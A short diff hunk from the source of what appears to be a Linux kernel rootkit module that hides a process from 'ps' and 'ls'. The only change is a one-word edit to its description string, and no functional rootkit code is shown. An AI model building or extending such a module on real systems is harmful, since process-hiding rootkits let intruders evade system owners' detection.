@@ -7,7 +7,7 @@
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Daniel Niv");
 MODULE_VERSION("0.0.1");
-MODULE_DESCRIPTION("Rootkit for hiding a process from 'ps' and 'ls' commands");
+MODULE_DESCRIPTION("a Rootkit for hiding a process from 'ps' and 'ls' commands");
 
 // the module parameters
 unsigned long kallsyms_lookup_addr;
